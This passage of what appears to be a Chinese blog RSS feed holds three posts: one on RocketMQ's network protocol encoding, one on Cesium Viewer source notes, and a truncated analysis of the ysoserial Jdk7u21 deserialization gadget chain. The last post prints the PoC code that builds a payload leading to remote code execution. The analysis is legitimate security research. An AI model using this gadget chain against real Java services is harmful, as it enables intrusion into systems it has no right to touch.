<description>&lt;p&gt;当网络中两个进程需要通信时，我们往往会使用 &lt;code&gt;Socket&lt;/code&gt; 来实现。&lt;code&gt;Socket&lt;/code&gt; 都不陌生。当三次握手成功后，客户端与服务端就能通信，并且，彼此之间通信的数据包格式都是二进制，由 &lt;code&gt;TCP/IP&lt;/code&gt; 协议负责传输。&lt;/p&gt;
&lt;p&gt;当客户端和服务端取得了二进制数据包后，我们往往需要『萃取』出想要的数据，这样才能更好的执行业务逻辑。所以，我们需要定义好数据结构来描述这些二进制数据的格式，这就是通信网络协议。简单讲，就是需要约定好二进制数据包中每一段字节的含义，比如从第 n 字节开始的 m 长度是核心数据，有了这样的约定后，我们就能解码出想要的数据，执行业务逻辑，这样我们就能畅通无阻的通信了。&lt;/p&gt;
&lt;h3 id=&quot;网络协议的设计&quot;&gt;网络协议的设计&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;概要划分&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个最基本的网络协议必须包含&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数据的长度&lt;/li&gt;
&lt;li&gt;数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;了解 &lt;code&gt;TCP&lt;/code&gt; 协议的同学一定听说过&lt;code&gt;粘包、拆包&lt;/code&gt; 这两个术语。因为&lt;code&gt;TCP&lt;/code&gt;协议是数据流协议，它的底层根据二进制缓冲区的实际情况进行包的划分。所以，不可避免的会出现&lt;code&gt;粘包，拆包&lt;/code&gt; 现象 。为了解决它们，我们的网络协议往往会使用一个 4 字节的 &lt;code&gt;int&lt;/code&gt; 类型来表示数据的大小。比如，&lt;code&gt;Netty&lt;/code&gt; 就为我们提供了 &lt;code&gt;LengthFieldBasedFrameDecoder&lt;/code&gt; 解码器，它可以有效的使用自定义长度帧来解决上述问题。&lt;/p&gt;
&lt;p&gt;同时一个好的网络协议，还会将动作和业务数据分离。试想一下， &lt;code&gt;HTTP&lt;/code&gt; 协议的分为请求头，请求体——&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;请求头：定义了接口地址、&lt;code&gt;Http Method&lt;/code&gt;、&lt;code&gt;HTTP&lt;/code&gt; 版本&lt;/li&gt;
&lt;li&gt;请求体：定义了需要传递的数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这就是一种分离关注点的思想。所以自定义的网络协议也可以包含：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;动作指令：比如定义 &lt;code&gt;code&lt;/code&gt; 来分门别类的代表不同的业务逻辑&lt;/li&gt;
&lt;li&gt;序列化算法：描述了 &lt;code&gt;JAVA&lt;/code&gt; 对象和二进制之间转换的形式，提供多种序列化/反序列化方式。比如 &lt;code&gt;json&lt;/code&gt;、&lt;code&gt;protobuf&lt;/code&gt; 等等，甚至是自定义算法。比如：&lt;code&gt;rocketmq&lt;/code&gt; 等等。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;同时，协议的开头可以定义一个约定的&lt;code&gt;魔数&lt;/code&gt;。这个固定值(4字节)，一般用来判断当前的数据包是否合法。比如，当我们使用 &lt;code&gt;telnet&lt;/code&gt; 发送错误的数据包时，很显然，它不合法，会导致解码失败。所以，为了减轻服务器的压力，我们可以取出数据包的前&lt;code&gt;4&lt;/code&gt;个字节与固定的&lt;code&gt;魔数&lt;/code&gt;对比，如果是非法的格式，直接关闭连接，不继续解码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络协议结构如下所示&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;+--------------+-----------+------------+-----------+----------+
| 魔数(4)       | code(1)   |序列化算法(1) |数据长度(4) |数据(n)   |
+--------------+-----------+------------+-----------+----------+ 
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;rocketmq-通信网络协议的实现&quot;&gt;RocketMQ 通信网络协议的实现&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;RocketMQ 网络协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这一小节，我们从&lt;code&gt;RocketMQ&lt;/code&gt; 中，分析优秀通信网络协议的实现。&lt;code&gt;RocketMQ&lt;/code&gt; 项目中，客户端和服务端的通信是基于 Netty 之上构建的。同时，为了更加有效的通信，往往需要对发送的消息自定义网络协议。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RocketMQ&lt;/code&gt; 的网络协议，从数据分类的角度上看，可分为两大类&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;消息头数据(Header Data)&lt;/li&gt;
&lt;li&gt;消息体数据(Body Data)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/299214/202003/299214-20200330040625987-1566249621.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从左到右&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;第一段：4 个字节整数，等于2、3、4 长度总和&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;第二段：4 个字节整数，等于3 的长度。特别的 &lt;code&gt;byte[0]&lt;/code&gt; 代表序列化算法，&lt;code&gt;byte[1~3]&lt;/code&gt;才是真正的长度&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;第三段：代表消息头数据，结构如下&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;{
    &quot;code&quot;:0,
    &quot;language&quot;:&quot;JAVA&quot;,
    &quot;version&quot;:0,
    &quot;opaque&quot;:0,
    &quot;flag&quot;:1,
    &quot;remark&quot;:&quot;hello, I am respponse /127.0.0.1:27603&quot;,
    &quot;extFields&quot;:{
        &quot;count&quot;:&quot;0&quot;,
        &quot;messageTitle&quot;:&quot;HelloMessageTitle&quot;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;第四段：代表消息体数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;RocketMQ 消息头协议详细如下：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Header 字段名&lt;/th&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;Request&lt;/th&gt;
&lt;th&gt;Response&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;9&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;code&lt;/td&gt;
&lt;td&gt;整数&lt;/td&gt;
&lt;td&gt;请求操作代码，请求接收方根据不同的代码做不同的操作&lt;/td&gt;
&lt;td&gt;应答结果代码，0表示成功，非0表示各种错误代码&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;language&lt;/td&gt;
&lt;td&gt;字符串&lt;/td&gt;
&lt;td&gt;请求发起方实现语言，默认JAVA&lt;/td&gt;
&lt;td&gt;应答接收方实现语言&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;version&lt;/td&gt;
&lt;td&gt;整数&lt;/td&gt;
&lt;td&gt;请求发起方程序版本&lt;/td&gt;
&lt;td&gt;应答接收方程序版本&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;opaque&lt;/td&gt;
&lt;td&gt;整数&lt;/td&gt;
&lt;td&gt;请求发起方在同一连接上不同的请求标识代码，多线程连接复用使用&lt;/td&gt;
&lt;td&gt;应答方不做修改，直接返回&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;flag&lt;/td&gt;
&lt;td&gt;整数&lt;/td&gt;
&lt;td&gt;通信层的标志位&lt;/td&gt;
&lt;td&gt;通信层的标志位&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;remark&lt;/td&gt;
&lt;td&gt;字符串&lt;/td&gt;
&lt;td&gt;传输自定义文本信息&lt;/td&gt;
&lt;td&gt;错误详细描述信息&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;extFields&lt;/td&gt;
&lt;td&gt;HashMap&amp;lt;String,String&amp;gt;&lt;/td&gt;
&lt;td&gt;请求自定义字段&lt;/td&gt;
&lt;td&gt;应答自定义字段&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;编码过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RocketMQ&lt;/code&gt; 的通信模块是基于 &lt;code&gt;Netty&lt;/code&gt;的。通过定义 &lt;code&gt;NettyEncoder&lt;/code&gt; 来实现对每一个 &lt;code&gt;Channel&lt;/code&gt;的 出栈数据进行编码，如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@ChannelHandler.Sharable
public class NettyEncoder extends MessageToByteEncoder&amp;lt;RemotingCommand&amp;gt; {
    @Override
    public void encode(ChannelHandlerContext ctx, RemotingCommand remotingCommand, ByteBuf out)
        throws Exception {
        try {
            ByteBuffer header = remotingCommand.encodeHeader();
            out.writeBytes(header);
            byte[] body = remotingCommand.getBody();
            if (body != null) {
                out.writeBytes(body);
            }
        } catch (Exception e) {
           ...
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，核心的编码过程位于 &lt;code&gt;RemotingCommand&lt;/code&gt; 对象中，&lt;code&gt;encodeHeader&lt;/code&gt; 阶段，需要统计出消息总长度，即：&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;定义消息头长度，一个整数表示：占4个字节&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;定义消息头数据，并计算其长度&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;定义消息体数据，并计算其长度&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;额外再加 4是因为需要加入消息总长度，一个整数表示：占4个字节&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public ByteBuffer encodeHeader(final int bodyLength) {
    // 1&amp;gt; 消息头长度，一个整数表示：占4个字节
    int length = 4;

    // 2&amp;gt; 消息头数据
    byte[] headerData;
    headerData = this.headerEncode();
    // 再加消息头数据长度
    length += headerData.length;

    // 3&amp;gt; 再加消息体数据长度
    length += bodyLength;
    // 4&amp;gt; 额外加 4是因为需要加入消息总长度，一个整数表示：占4个字节
    ByteBuffer result = ByteBuffer.allocate(4 + length - bodyLength);

    // 5&amp;gt; 将消息总长度加入 ByteBuffer
    result.putInt(length);

    // 6&amp;gt; 将消息的头长度加入 ByteBuffer
    result.put(markProtocolType(headerData.length, serializeTypeCurrentRPC));

    // 7&amp;gt; 将消息头数据加入 ByteBuffer
    result.put(headerData);

    result.flip();

    return result;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，&lt;code&gt;encode&lt;/code&gt; 阶段会将 &lt;code&gt;CommandCustomHeader&lt;/code&gt; 数据转换 &lt;code&gt;HashMap&amp;lt;String,String&amp;gt;&lt;/code&gt;，方便序列化&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void makeCustomHeaderToNet() {
    if (this.customHeader != null) {
        Field[] fields = getClazzFields(customHeader.getClass());
        if (null == this.extFields) {
            this.extFields = new HashMap&amp;lt;String, String&amp;gt;();
        }

        for (Field field : fields) {
            if (!Modifier.isStatic(field.getModifiers())) {
                String name = field.getName();
                if (!name.startsWith(&quot;this&quot;)) {
                    Object value = null;
                    try {
                        field.setAccessible(true);
                        value = field.get(this.customHeader);
                    } catch (Exception e) {
                        log.error(&quot;Failed to access field [{}]&quot;, name, e);
                    }

                    if (value != null) {
                        this.extFields.put(name, value.toString());
                    }
                }
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;特别的，消息头序列化支持两种算法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;JSON&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RocketMQ&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private byte[] headerEncode() {
    this.makeCustomHeaderToNet();
    if (SerializeType.ROCKETMQ == serializeTypeCurrentRPC) {
        return RocketMQSerializable.rocketMQProtocolEncode(this);
    } else {
        return RemotingSerializable.encode(this);
    }
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这儿需要值得注意的是，&lt;code&gt;encode&lt;/code&gt;阶段将当前 &lt;code&gt;RPC&lt;/code&gt; 类型和 &lt;code&gt;headerData&lt;/code&gt;长度编码到一个 &lt;code&gt;byte[4]&lt;/code&gt; 数组中，&lt;code&gt;byte[0]&lt;/code&gt; 位序列化类型。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static byte[] markProtocolType(int source, SerializeType type) {
    byte[] result = new byte[4];

    result[0] = type.getCode();
    result[1] = (byte) ((source &amp;gt;&amp;gt; 16) &amp;amp; 0xFF);
    result[2] = (byte) ((source &amp;gt;&amp;gt; 8) &amp;amp; 0xFF);
    result[3] = (byte) (source &amp;amp; 0xFF);
    return result;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，通过与运算 &lt;code&gt;&amp;amp; 0xFF&lt;/code&gt; 取低八位数据。&lt;/p&gt;
&lt;p&gt;所以， 最终 &lt;code&gt;length&lt;/code&gt; 长度等于序列化类型 + header length + header data + body data 的字节的长度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解码过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RocketMQ&lt;/code&gt; 解码通过&lt;code&gt;NettyDecoder&lt;/code&gt;来实现，它继承自 &lt;code&gt;LengthFieldBasedFrameDecoder&lt;/code&gt;，其中调用了父类&lt;code&gt;LengthFieldBasedFrameDecoder&lt;/code&gt;的构造函数&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;super(FRAME_MAX_LENGTH, 0, 4, 0, 4);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这些参数设置&lt;code&gt;4&lt;/code&gt;个字节代表 &lt;code&gt;length&lt;/code&gt;总长度，同时解码时跳过最开始的&lt;code&gt;4&lt;/code&gt;个字节：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;frame = (ByteBuf) super.decode(ctx, in);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以，得到的 &lt;code&gt;frame&lt;/code&gt;= 序列化类型 + header length + header data + body data 。解码如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static RemotingCommand decode(final ByteBuffer byteBuffer) {
    //总长度
    int length = byteBuffer.limit();
    //原始的 header length，4位
    int oriHeaderLen = byteBuffer.getInt();
    //真正的 header data 长度。忽略 byte[0]的 serializeType
    int headerLength = getHeaderLength(oriHeaderLen);

    byte[] headerData = new byte[headerLength];
    byteBuffer.get(headerData);

    RemotingCommand cmd = headerDecode(headerData, getProtocolType(oriHeaderLen));

    int bodyLength = length - 4 - headerLength;
    byte[] bodyData = null;
    if (bodyLength &amp;gt; 0) {
        bodyData = new byte[bodyLength];
        byteBuffer.get(bodyData);
    }
    cmd.body = bodyData;

    return cmd;
}

private static RemotingCommand headerDecode(byte[] headerData, SerializeType type) {
    switch (type) {
        case JSON:
            RemotingCommand resultJson = RemotingSerializable.decode(headerData, RemotingCommand.class);
            resultJson.setSerializeTypeCurrentRPC(type);
            return resultJson;
        case ROCKETMQ:
            RemotingCommand resultRMQ = RocketMQSerializable.rocketMQProtocolDecode(headerData);
            resultRMQ.setSerializeTypeCurrentRPC(type);
            return resultRMQ;
        default:
            break;
    }

    return null;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，&lt;code&gt;getProtocolType&lt;/code&gt;，右移 &lt;code&gt;24&lt;/code&gt;位，拿到 &lt;code&gt;serializeType&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static SerializeType getProtocolType(int source) {
    return SerializeType.valueOf((byte) ((source &amp;gt;&amp;gt; 24) &amp;amp; 0xFF));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;getHeaderLength&lt;/code&gt; 拿到 0-24 位代表的 &lt;code&gt;headerData&lt;/code&gt; length：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static int getHeaderLength(int length) {
    return length &amp;amp; 0xFFFFFF;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;小结&quot;&gt;小结&lt;/h3&gt;
&lt;p&gt;对于诸多中间件而言，底层的网络通信模块往往会使用 &lt;code&gt;Netty&lt;/code&gt;。&lt;code&gt;Netty&lt;/code&gt; 提供了诸多的编解码器，可以快速方便的上手。本文从如何设计一个网络协议入手，最终切入到 &lt;code&gt;RocketMQ&lt;/code&gt; 底层网络协议的实现。可以看到，它并不复杂。仔细研读几遍变能理解其奥义。具体参考类&lt;code&gt;NettyEncoder&lt;/code&gt;、&lt;code&gt;NettyDecoder&lt;/code&gt;、&lt;code&gt;RemotingCommand&lt;/code&gt;。&lt;/p&gt;
</description>
<pubDate>Sun, 29 Mar 2020 20:03:00 +0000</pubDate>
<dc:creator>木宛城主</dc:creator>
<og:description>当网络中两个进程需要通信时，我们往往会使用 来实现。 都不陌生。当三次握手成功后，客户端与服务端就能通信，并且，彼此之间通信的数据包格式都是二进制，由 协议负责传输。 当客户端和服务端取得了二进制数据</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/OceanEyes/p/protocol_design.html</dc:identifier>
</item>
<item>
<title>Cesium 源码笔记[1] Viewer模块实例化的大致过程 ver1.67 - 秋意正寒</title>
<link>http://www.cnblogs.com/onsummer/p/12571971.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/onsummer/p/12571971.html</guid>
<description>&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;我原本想写日记的，但是不太现实。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;源码可以从源码包和发行包中的Source目录中获取。&lt;/p&gt;
&lt;p&gt;Cesium的模块化机制从1.63版本开始，由原来的RequireJs变为ES6。但有可能是原先设计耦合的问题，内部依旧是ES5实现。&lt;/p&gt;

&lt;p&gt;写Cesium程序时，都写过这一句：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;let viewer = new Cesium.Viewer(dom)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者这样&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;let viewer = new Cesium.Viewer(dom, {
    terrainProvider: Cesium.createWorldTerrain()
})
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那它究竟在后面发生了什么呢？&lt;/p&gt;

&lt;p&gt;定位到302行，Viewer的构造函数如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;function Viewer(container, options) {
    ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就从这个长达400多行的构造函数看起吧！&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;// 304~309行
if (!defined(container)) {
    throw new DeveloperError('container is required.');
}
container = getElement(container);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这一步，是看看DOM元素是否存在，使用getElement模块判断是domID或者是DOM元素变量，并返回。&lt;/p&gt;
&lt;h2 id=&quot;工具模块：defaultvalue&quot;&gt;工具模块：defaultValue&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;// 310行
options = defaultValue(options, defaultValue.EMPTY_OBJECT);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这一步是判断传进来的options对象是否为空，如果为空，那就使用空对象预设值（&lt;code&gt;defaultValue.EMPTY_OBJECT）&lt;/code&gt;）。其中，&lt;code&gt;defaultValue&lt;/code&gt;是一个重要的模块，它判断第一个参数如果是undefined，就把第二个参数作为它的值返回，如果不是undefined，那就返回它本身。&lt;/p&gt;
&lt;h2 id=&quot;工具模块：defined&quot;&gt;工具模块：defined&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;// 312~313行
var createBaseLayerPicker = (!defined(options.globe) || options.globe !== false) &amp;amp;&amp;amp; 
(!defined(options.baseLayerPicker) || options.baseLayerPicker !== false);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这一步通过defined模块判断构造参数options是否有globe属性、baseLayerPicker属性来决定是否创建底图选择器控件。defined模块的作用就是，判断传入值是否定义，定义了就返回true。&lt;/p&gt;
&lt;p&gt;329行将Viewer实例的this变量赋予给that变量。&lt;/p&gt;
&lt;p&gt;331~344行是Viewer视图底下的一堆空间的div DOM元素创建。&lt;/p&gt;
&lt;p&gt;346~362行，利用defaultValue模块和defined模块&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;判断传入参数options中scene3DOnly参数是否赋值，如果没有则默认为false，即是否仅使用3d场景的意思；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;判断传入参数options中的时钟模型属性clockViewModel是否存在，来决定是用传入的时钟模型，亦或者是用系统的时钟模型；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;判断传入参数options中是否定义了shouldAnimate属性，如果定义了，则将时钟的同名属性设为同样的值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;// Cesium.js 364~388行
var cesiumWidget = new CesiumWidget(cesiumWidgetContainer, {
    imageryProvider: createBaseLayerPicker || defined(options.imageryProvider) ? false : undefined,
    clock : clock,
    skyBox : options.skyBox,
    skyAtmosphere : options.skyAtmosphere,
    sceneMode : options.sceneMode,
    mapProjection : options.mapProjection,
    globe : options.globe,
    // ... 太长了不贴了
});
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这一步和创建Viewer很像，但是它却更接近数据承载体一步。&lt;/p&gt;
&lt;p&gt;为了保证单元的完整性，CesiumWidget的实例化，后面再说。提前透露：高频API，Scene、imageryProvider、Globe等均在这一步继续创建。&lt;/p&gt;

&lt;p&gt;390~615行，是对Viewer的一些其他属性的初始化，分别是界面上的一众按钮、时间轴等控件的初始化，以及事件总管理者（EventHelper模块）的初始化、重要的DataSourceCollection/DataSourceDisplay的初始化。&lt;/p&gt;
&lt;p&gt;在后面Viewer部分的笔记中，关于这些控件的初始化，还会继续详细展开。&lt;/p&gt;
&lt;p&gt;DataSourceCollection/DataSourceDisplay属于数据范围，不列入Viewer部分的笔记中。&lt;/p&gt;
&lt;p&gt;最后，将以上初始化的对象，全部注册注册为当前Viewer实例的属性，并将其中一些对象例如dataSourceCollection的一些事件一并注册到Viewer的原型上。&lt;/p&gt;
&lt;p&gt;除了以上初始化之外，Cesium还默认为cesiumWidget注册了屏幕操作事件的点击、双击事件，方便初始化完成后能通过点击来拾取场景中的Entity（场景Scene、实体Entity是数据范围，不作详细介绍了），这两个事件使用cesiumWidget.screenSpaceEventHandler.setInputAction方法来注册。这两个事件位于构造函数的689~708行。&lt;/p&gt;

&lt;h2 id=&quot;工具方法：objectdefineproperties&quot;&gt;工具方法：Object.defineProperties&lt;/h2&gt;
&lt;p&gt;这几乎是每一个Cesium模块都会做的一步，使用Object.defineProperties，为某个对象赋予某个属性。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;据说这个Object.defineProperties是近几个版本才启用的，之前js没有这个方法时，是用Cesium.defineProperties的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在Viewer.js模块中的711~1292行，官方为Viewer的原型定义了一大批属性，包括上文提及的初始化的多个对象、事件等，还包括上文创建的各个初始化的对象的一些属性快捷连接，以便能在Viewer实例上直接访问其他模块的属性。&lt;/p&gt;
&lt;p&gt;例如你既能在Viewer上获取camera，也能在Scene模块获取camera，只不过Viewer上返回的camera也要先访问scene罢了。&lt;/p&gt;
&lt;p&gt;随后，在1294&lt;sub&gt;1523行和1724&lt;/sub&gt;1858行，为Viewer的原型定义了一堆API文档中能看到的公共方法；在1525&lt;sub&gt;1703和1863&lt;/sub&gt;2056行为Viewer的原型定义了一堆私有方法。&lt;/p&gt;

&lt;p&gt;最后，在2066行，使用es6语法导出Viewer构造函数。&lt;/p&gt;
&lt;blockquote readability=&quot;3.8507462686567&quot;&gt;
&lt;p&gt;版权所有。转载请联系我，B站/知乎/小专栏/博客园/CSDN @秋意正寒&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/onsummer/p/12571971.html&quot;&gt;https://www.cnblogs.com/onsummer/p/12571971.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Sun, 29 Mar 2020 18:39:00 +0000</pubDate>
<dc:creator>秋意正寒</dc:creator>
<og:description>我原本想写日记的，但是不太现实。 源码下载 源码可以从源码包和发行包中的Source目录中获取。 Cesium的模块化机制从1.63版本开始，由原来的RequireJs变为ES6。但有可能是原先设计耦</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/onsummer/p/12571971.html</dc:identifier>
</item>
<item>
<title>ysoserial分析【二】7u21和URLDNS - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/12596286.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/12596286.html</guid>
<description>&lt;p&gt;7u21中利用了TemplatesImpl来执行命令，结合动态代理、AnnotationInvocationHandler、HashSet都成了gadget链。&lt;/p&gt;
&lt;p&gt;先看一下调用栈，把ysoserial中的调用栈简化了一下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;LinkedHashSet.readObject()
  LinkedHashSet.add()
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        对_bytecodes属性的值(实例的字节码)进行实例化
                          RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中关于&lt;code&gt;TemplatsImpl&lt;/code&gt;类如何执行恶意代码的知识可以参考另一篇文章中对CommonsCollections2的分析，这里不再赘述。只要知道这里调用&lt;code&gt;TemplatesImpl.getOutputProperties()&lt;/code&gt;可以执行恶意代码即可。&lt;/p&gt;
&lt;p&gt;看一下ysoserial的poc&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;

public Object getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);//返回构造好的TemplatesImpl实例，实例的_bytecodes属性的值是执行恶意语句类的字节码

    String zeroHashCodeStr = &quot;f5a5a608&quot;;
    HashMap map = new HashMap();
    map.put(zeroHashCodeStr, &quot;foo&quot;);

    InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(Override.class, map);//map作为构造方法的第二个参数，map赋值给AnnotationInvocationHandler.membervalues属性

    Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);
    Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);//为AIH创建代理

    LinkedHashSet set = new LinkedHashSet(); //LinkedHashSet父类是HashSet
    set.add(templates);//TemplatesImpl实例
    set.add(proxy);//AnnotationInvocationHandler实例的代理，AnnotationInvocationHandler的membervalues是TemplatesImple实例

    Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, null);
    Reflections.setFieldValue(templates, &quot;_class&quot;, null);

    map.put(zeroHashCodeStr, templates); //绑定到AnnotationInvocationHandler的那个map中的再添加一组键值对，value是TemplatesImpl实例。但是由于map中的第一组键值对的键也是zeroHashCodeStr，因此这里就是相当于把第一个键值对的value重新复赋值了。

    return set;//返回LinkedHashSet实例，用于序列化
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总体来说就是返回一个&lt;code&gt;LinkedHashSet&lt;/code&gt;实例，其中有两个元素，第一个元素是&lt;code&gt;_bytecodes&lt;/code&gt;属性是恶意类字节码的TemplatesImpl实例。&lt;/p&gt;
&lt;p&gt;第二个元素是AnnotationInvocationHandler的代理实例，这个AnnotationInvocationHandler实例在初始化时将一个HashMap实例传入，HashMap的第一个元素的key是TemplatesImpl实例。&lt;/p&gt;
&lt;p&gt;看一下AnnotationInvocationHandler的构造方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; var1, Map&amp;lt;String, Object&amp;gt; var2) {
    this.type = var1;
    this.memberValues = var2;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是把这个HashMap实例赋值给了&lt;code&gt;memberValues&lt;/code&gt;属性。&lt;/p&gt;
